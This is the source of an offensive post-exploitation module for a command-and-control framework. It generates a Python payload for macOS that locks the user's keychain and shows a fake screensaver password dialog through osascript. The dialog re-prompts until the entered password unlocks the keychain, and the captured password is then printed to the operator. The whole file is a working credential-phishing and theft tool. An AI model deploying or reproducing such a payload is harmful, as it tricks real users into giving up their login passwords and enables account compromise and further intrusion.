class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'ScreensaverAlleyOop',

            # list of one or more authors for the module
            'Author': ['@FuzzyNop', '@harmj0y', '@enigma0x3', '@Killswitch-GUI'],

            # more verbose multi-line description of the module
            'Description': ('Launches a screensaver with a prompt for credentials with osascript. '
                            'This locks the user out until the password can unlock the user keychain. '
                            'This allows you to prevent Sudo/su failed logon attempts. (credentials till I get them!)'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "https://github.com/fuzzynop/FiveOnceInYourLife",
                "https://github.com/enigma0x3/Invoke-LoginPrompt"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ExitCount' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Exit Screensaver after # of attempts',
                'Required'      :   True,
                'Value'         :   '15'
            },
            'Verbose' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   'False'
            },


        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        exitCount = self.options['ExitCount']['Value']
        verbose = self.options['Verbose']['Value']

        script = '''
import subprocess
import time
import sys

def myrun(cmd):
    """from http://blog.kagesenshi.org/2008/02/teeing-python-subprocesspopen-output.html"""
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line)
        if line == '' and p.poll() != None:
            break
    return ''.join(stdout)

def lockchain():
    # do this to ensure keychain is locked
    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
    subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)

def unlockchain(password):
    cmd = 'security unlock-keychain -p ' + str(password)
    #process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    #text = process.communicate()
    text = myrun(cmd)
    #print "text: " + str(text)
    if text == '':
        return True
    else:
        return False
def retrypassword():
    process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "Login"'""", stdout=subprocess.PIPE, shell=True)
    text = process.communicate()
    return text[0]

def parse(text):
    text = text.split(':')
    password = text[-1]
    password.rstrip('\\n')
    password.rstrip('\\r')
    password.replace('!','%%21')
    password.replace('#','%%23')
    password.replace('$','%%24')
    return password

def run(exitCount, verbose=False):
    try:
        process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
        text = process.communicate()
        text = text[0]
        count = 0
        while True:
            if exitCount:
                count += 1
                if count > exitCount:
                    break
            if 'button returned:OK, text returned:' in text:
                password = parse(text)
                if password:
                    lockchain()
                    # try to get first password
                    correct = unlockchain(password)
                    if correct:
                        # we found the right password!
                        print '[!] unlock-keychain passed: ' + str(password)
                        break
                    else:
                        print "[*] Bad password: " + str(password)
                        text = retrypassword()
            else:
                text = retrypassword()
    except Exception as e:
        print e

exitCount = %s
verbose = %s
run(exitCount, verbose=verbose)
''' %(exitCount, verbose)

        return script
